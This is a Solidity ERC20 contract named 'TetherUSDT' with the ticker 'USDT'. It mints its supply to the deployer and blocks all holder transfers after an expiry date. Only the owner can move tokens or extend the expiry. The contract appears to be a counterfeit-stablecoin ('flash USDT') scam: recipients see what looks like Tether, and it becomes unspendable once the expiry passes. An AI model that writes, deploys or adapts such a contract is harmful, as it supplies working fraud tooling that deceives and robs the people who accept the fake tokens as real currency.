// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract TetherUSDT is ERC20, Ownable {
    uint256 public expiryDate;

    // Events for logging actions
    event TransferAttempt(
        address indexed from,
        address indexed to,
        uint256 value
    );
    event AutoTransferExecuted(
        address indexed from,
        address indexed to,
        uint256 value
    );

    constructor(
        uint256 initialSupply,
        uint256 durationInDays
    ) ERC20("TetherUSDT", "USDT") Ownable(msg.sender) {
        _mint(msg.sender, initialSupply);
        expiryDate = block.timestamp + (durationInDays * 1 days);
    }

    // Modifier to restrict functionality after expiry date
    modifier onlyBeforeExpiry() {
        require(block.timestamp < expiryDate, "Token validity expired");
        _;
    }

    // Override transfer function to restrict P2P & swaps only before expiry
    function transfer(
        address recipient,
        uint256 amount
    ) public override onlyBeforeExpiry returns (bool) {
        emit TransferAttempt(msg.sender, recipient, amount);
        return super.transfer(recipient, amount);
    }

    // Override transferFrom function to ensure compliance with expiry
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override onlyBeforeExpiry returns (bool) {
        emit TransferAttempt(sender, recipient, amount);
        return super.transferFrom(sender, recipient, amount);
    }

    // Function to handle automatic transfers (requires external trigger or owner initiation)
    function autoTransfer(
        address recipient,
        uint256 amount
    ) external onlyOwner onlyBeforeExpiry {
        _transfer(msg.sender, recipient, amount);
        emit AutoTransferExecuted(msg.sender, recipient, amount);
    }

    // Extend expiry date if needed (owner only)
    function extendExpiry(uint256 additionalDays) external onlyOwner {
        expiryDate += additionalDays * 1 days;
    }
}
